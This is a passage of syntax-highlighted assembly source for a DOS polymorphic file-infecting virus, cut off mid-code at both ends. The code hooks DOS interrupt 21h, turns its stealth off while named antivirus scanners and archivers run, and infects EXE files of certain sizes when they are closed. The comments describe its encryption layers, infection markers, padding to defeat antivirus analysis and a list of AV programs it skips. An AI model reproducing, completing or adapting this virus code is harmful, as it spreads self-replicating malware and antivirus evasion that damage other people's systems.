                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">special_names</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">32h</span><span class="sc0">                  </span><span class="sc1">; Check which function</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">disable_stealth</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4ch</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">enable_stealth</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc5">search_dot</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc12">'.'</span><span class="sc0">       </span><span class="sc1">; Is a dot?</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">name_check</span><span class="sc0">              </span><span class="sc1">; If so go to name_check</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">         </span><span class="sc1">; End of the name?</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">int_execute_exit</span><span class="sc0">        </span><span class="sc1">; Exit if so</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">search_dot</span><span class="sc0">        </span><span class="sc1">; Search the dot</span><span class="sc0">

</span><span class="sc1">; Check if is one of the names in our table</span><span class="sc0">

</span><span class="sc5">name_check</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">                      </span><span class="sc1">; On last filename letter</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">                      </span><span class="sc1">; Point on the non-infectable</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">; names table</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">name_check</span><span class="sc0">              </span><span class="sc1">; If equal continue comp.</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">' '</span><span class="sc0">                  </span><span class="sc1">; finished our name?</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">disable_stealth</span><span class="sc0">         </span><span class="sc1">; EQ = yes, so disable st.</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">                    </span><span class="sc1">; Skip to next name</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">    </span><span class="sc1">; finished table?</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">search_dot</span><span class="sc0">              </span><span class="sc1">; No, continue search</span><span class="sc0">
</span><span class="sc5">enable_stealth</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">stealth_enabled</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">int_execute_exit</span><span class="sc0">
</span><span class="sc5">disable_stealth</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">stealth_enabled</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">int_execute_exit</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">jmp_to_old_int21h</span><span class="sc0">

</span><span class="sc1">; When one of this programs is runned the virus will totally disable it's</span><span class="sc0">
</span><span class="sc1">; stealth features.</span><span class="sc0">

</span><span class="sc5">special_names</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'NACSBT  '</span><span class="sc0">              </span><span class="sc1">; TBScan</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'NIW     '</span><span class="sc0">              </span><span class="sc1">; Windows</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'PUTESBT '</span><span class="sc0">              </span><span class="sc1">; TBSetup</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'PIZKP   '</span><span class="sc0">              </span><span class="sc1">; PKZip</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'JRA     '</span><span class="sc0">              </span><span class="sc1">; Arj</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'RAR     '</span><span class="sc0">              </span><span class="sc1">; Rar</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'AHL     '</span><span class="sc0">              </span><span class="sc1">; Lha</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'FNIDA   '</span><span class="sc0">              </span><span class="sc1">; Adinf</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">


</span><span class="sc1">; The Int_close_infect is the routine that will infect a file that is</span><span class="sc0">
</span><span class="sc1">; going to be closed using function 3Eh. Infection will be possible only</span><span class="sc0">
</span><span class="sc1">; if:   - stealth is enabled (so no AV/compressor is running)</span><span class="sc0">
</span><span class="sc1">;       - default drive is a fixed drive (to prevent big loss of time)</span><span class="sc0">
</span><span class="sc1">;       - the handle is minor than 5. This is to be sure it is a file handle</span><span class="sc0">
</span><span class="sc1">; The infection routine uses SFTs for some operations. Infected files are</span><span class="sc0">
</span><span class="sc1">; longer than 5000 bytes and shorter than 383kb. Some AVs won't be infected.</span><span class="sc0">
</span><span class="sc1">; The virus will of course also save the original EXE header for future</span><span class="sc0">
</span><span class="sc1">; stealth. The original EXE header is encrypted with a 8-bit XOR with the</span><span class="sc0">
</span><span class="sc1">; value of the time of the file.</span><span class="sc0">
</span><span class="sc1">; The virus will put also a check in the EXE header that is calculated</span><span class="sc0">
</span><span class="sc1">; from the original EXE. This is done by adding 17h to the new SS and then</span><span class="sc0">
</span><span class="sc1">; by rol-ing by one. This calculated value will be used also as the random</span><span class="sc0">
</span><span class="sc1">; number from which depends the poly routine. So the decryption routine and</span><span class="sc0">
</span><span class="sc1">; the decryption values will be the same if two identical files are infected.</span><span class="sc0">
</span><span class="sc1">; This may be considered quite funny, because may fool some AV homebrewers</span><span class="sc0">
</span><span class="sc1">; that was triing to study the virus on a couple of identical goats :-)</span><span class="sc0">
</span><span class="sc1">;  The poly engine isn't very complex. The decryptor has always some fixed</span><span class="sc0">
</span><span class="sc1">; instructions at the same place, so i don't think it would be too hard to</span><span class="sc0">
</span><span class="sc1">; get them. Random instructions are also put in some predefined places in</span><span class="sc0">
</span><span class="sc1">; the decryptor. The random instructions aren't generated 'on the fly' but</span><span class="sc0">
</span><span class="sc1">; rather selected from a table of suitable instructions. There are two layers</span><span class="sc0">
</span><span class="sc1">; of encryption. The first is a ROL or ROR loop, the second is ADD or SUB</span><span class="sc0">
</span><span class="sc1">; loop. It is quite interesting that the virus when encrypting the body</span><span class="sc0">
</span><span class="sc1">; to infect a file doesn't need another extra space, but will encrypt itself</span><span class="sc0">
</span><span class="sc1">; in memory and will just leave of course the decryptor, a routine that</span><span class="sc0">
</span><span class="sc1">; writes the encrypted body to the file and a call to the decryptor that</span><span class="sc0">
</span><span class="sc1">; will decrypt again the body in memory.</span><span class="sc0">
</span><span class="sc1">;  In addition to try to make the life of avw more difficoult the virus</span><span class="sc0">
</span><span class="sc1">; will put on the tail of the infected host a random number of bytes. This</span><span class="sc0">
</span><span class="sc1">; random number of bytes is a derivate from the file time, so the virus</span><span class="sc0">
</span><span class="sc1">; will be able to know how much stuff did it put when it will stealth the</span><span class="sc0">
</span><span class="sc1">; virus size.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">


</span><span class="sc5">int_close_infect</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">                      </span><span class="sc1">; Save registers</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">pushf</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">05h</span><span class="sc0">                  </span><span class="sc1">; Only handles &lt; 05h</span><span class="sc0">
                </span><span class="sc6">jnb</span><span class="sc0">     </span><span class="sc5">seems_an_ok_handle</span><span class="sc0">      </span><span class="sc1">; To be sure it is a file</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">int_close_exit</span><span class="sc0">
</span><span class="sc5">seems_an_ok_handle</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_default_dr</span><span class="sc0">          </span><span class="sc1">; Infect only if the curr.</span><span class="sc0">
                </span><span class="sc6">jnb</span><span class="sc0">     </span><span class="sc5">ok_default_dr</span><span class="sc0">           </span><span class="sc1">; default drive is &gt; B:</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">int_close_exit</span><span class="sc0">
</span><span class="sc5">ok_default_dr</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">stealth_enabled</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">   </span><span class="sc1">; Stealth enabled?</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">stealth_is_enabled</span><span class="sc0">      </span><span class="sc1">; Continue if it is</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">int_close_exit</span><span class="sc0">
</span><span class="sc5">stealth_is_enabled</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_sft</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">sft_es</span><span class="sc4">],</span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">sft_di</span><span class="sc4">],</span><span class="sc8">di</span><span class="sc0">              </span><span class="sc1">; Check if it is an EXE</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">28h</span><span class="sc4">],</span><span class="sc12">'XE'</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">seems_an_exe</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">int_close_exit</span><span class="sc0">
</span><span class="sc5">seems_an_exe</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">2Ah</span><span class="sc4">],</span><span class="sc12">'E'</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">is_an_exe</span><span class="sc0">               </span><span class="sc1">; Well, it is a .EXE</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">int_close_exit</span><span class="sc0">
</span><span class="sc5">is_an_exe</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">check_filetime</span><span class="sc0">          </span><span class="sc1">; Check file time</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">ok_time</span><span class="sc0">                 </span><span class="sc1">; NZ -&gt; Not our timemarker</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">int_close_exit</span><span class="sc0">
</span><span class="sc5">ok_time</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">seek_woff</span><span class="sc0">               </span><span class="sc1">; Go to start of the file</span><span class="sc0">

                </span><span class="sc5">nosmart</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">exe_header_space</span><span class="sc0">     </span><span class="sc1">; Point the header buffer</span><span class="sc0">
                </span><span class="sc5">smart</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">read_header</span><span class="sc0">             </span><span class="sc1">; Read EXE header</span><span class="sc0">
                </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">read_header_passed</span><span class="sc0">      </span><span class="sc1">; Jump if no errors</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">int_close_exit</span><span class="sc0">
</span><span class="sc5">read_header_passed</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">18h</span><span class="sc4">],</span><span class="sc2">40h</span><span class="sc0">   </span><span class="sc1">; Is a WinExe?</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">no_winexe</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">int_close_exit</span><span class="sc0">
</span><span class="sc5">no_winexe</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">                 </span><span class="sc1">; First header byte</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4Dh</span><span class="sc0">                  </span><span class="sc1">; 'M'. MZ exe check</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">first_byte_exe</span><span class="sc0">          </span><span class="sc1">; Zero if is 'M'</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">int_close_exit</span><span class="sc0">
</span><span class="sc5">first_byte_exe</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">12h</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">; On checksum is our</span><span class="sc0">
                </span><span class="sc6">ror</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                    </span><span class="sc1">; infection check.</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">83h</span><span class="sc4">,</span><span class="sc2">0e8h</span><span class="sc4">,</span><span class="sc2">17h</span><span class="sc0">            </span><span class="sc1">; SUB ax,17h</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">0Eh</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">; Infection check in header</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">not_equal_check</span><span class="sc0">         </span><span class="sc1">; NE -&gt; Not infected</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">int_close_exit</span><span class="sc0">          </span><span class="sc1">; If infected go away</span><span class="sc0">
</span><span class="sc5">not_equal_check</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4202h</span><span class="sc0">                </span><span class="sc1">; Go to end of file</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">cwd</span><span class="sc0">                             </span><span class="sc1">; DX:CX = 0</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_orig_int21h</span><span class="sc0">          </span><span class="sc1">; do the int 21h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">lenght_dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">            </span><span class="sc1">; Store lenght</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">lenght_ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">                   </span><span class="sc1">; Shorter than 64k?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">check_ax_lenght</span><span class="sc0">         </span><span class="sc1">; If so do another check</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">
                </span><span class="sc6">jbe</span><span class="sc0">     </span><span class="sc5">ok_dx_lenght</span><span class="sc0">            </span><span class="sc1">; Ok if shorter than 383k</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">int_close_exit</span><span class="sc0">
</span><span class="sc5">ok_dx_lenght</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">ok_axdx_lenght</span><span class="sc0">
</span><span class="sc5">check_ax_lenght</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5000d</span><span class="sc0">                </span><span class="sc1">; Shorter than 5000 bytes?</span><span class="sc0">
                </span><span class="sc6">jae</span><span class="sc0">     </span><span class="sc5">ok_axdx_lenght</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">int_close_exit</span><span class="sc0">          </span><span class="sc1">; If shorter then go away!</span><span class="sc0">
</span><span class="sc5">ok_axdx_lenght</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">; Check for overlays</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">200h</span><span class="sc0">
                </span><span class="sc6">mul</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">                      </span><span class="sc1">; Calculate the lenght</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">; of the EXE from the</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">                   </span><span class="sc1">; header data</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">no_last_page_c</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">200h</span><span class="sc0">
        </span><span class="sc6">sbb</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">                   </span><span class="sc1">; Add Last Page count</span><span class="sc0">
        </span><span class="sc6">adc</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">no_last_page_c</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">lenght_ax</span><span class="sc0">            </span><span class="sc1">; Compare header and real</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">eq_ax_lenght</span><span class="sc0">            </span><span class="sc1">; lenght of the file</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">int_close_exit</span><span class="sc0">          </span><span class="sc1">; Go away if different</span><span class="sc0">
</span><span class="sc5">eq_ax_lenght</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">lenght_dx</span><span class="sc0">            </span><span class="sc1">; Compare header and real</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">eq_dx_lenght</span><span class="sc0">            </span><span class="sc1">; lenght of the file</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">int_close_exit</span><span class="sc0">          </span><span class="sc1">; Go away if different</span><span class="sc0">
</span><span class="sc5">eq_dx_lenght</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">20h</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; DX=first two letters of</span><span class="sc0">
                                                </span><span class="sc1">; the filename of the program</span><span class="sc0">
                                                </span><span class="sc1">; being infected</span><span class="sc0">
                </span><span class="sc5">nosmart</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">av_names</span><span class="sc0">             </span><span class="sc1">; Point to non infectables</span><span class="sc0">
                </span><span class="sc5">smart</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0Dh</span><span class="sc0">

</span><span class="sc5">av_name_loop</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">lodsw</span><span class="sc0">                           </span><span class="sc1">; Get next AV</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">                   </span><span class="sc1">; Compare two letters</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">no_current_av</span><span class="sc0">           </span><span class="sc1">; Not equal go to next AV</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">int_close_exit</span><span class="sc0">          </span><span class="sc1">; Equal exit infection</span><span class="sc0">
</span><span class="sc5">no_current_av</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">av_name_loop</span><span class="sc0">            </span><span class="sc1">; Loop trought all AVs</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">

                </span><span class="sc5">nosmart</span><span class="sc0">                         </span><span class="sc1">; Point on IP</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,(</span><span class="sc5">exe_header_space</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">14h</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">victim_ip</span><span class="sc0">            </span><span class="sc1">; Space for old IP</span><span class="sc0">
                </span><span class="sc5">smart</span><span class="sc0">
                                               
                </span><span class="sc6">movsw</span><span class="sc0">                           </span><span class="sc1">; Save original CS and IP</span><span class="sc0">
                </span><span class="sc6">movsw</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">0Ah</span><span class="sc0">                  </span><span class="sc1">; Point on original SS</span><span class="sc0">

                </span><span class="sc5">nosmart</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">add_to_ax</span><span class="sc0">
                </span><span class="sc5">smart</span><span class="sc0">

                </span><span class="sc6">movsw</span><span class="sc0">                           </span><span class="sc1">; Save SS</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">                      </span><span class="sc1">; Point to "mov sp,0"</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">movsw</span><span class="sc0">                           </span><span class="sc1">; Save SP</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">12h</span><span class="sc0">                  </span><span class="sc1">; SI = 0</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">

                </span><span class="sc5">nosmart</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">head_buffer</span><span class="sc0">
                </span><span class="sc5">smart</span><span class="sc0">

                </span><span class="sc6">cld</span><span class="sc0">                             </span><span class="sc1">; Copy EXE header to our</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">18h</span><span class="sc0">                  </span><span class="sc1">; head_buffer</span><span class="sc0">
                </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">


                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5700h</span><span class="sc0">                </span><span class="sc1">; Get file's Date and Time</span><span class="sc0">
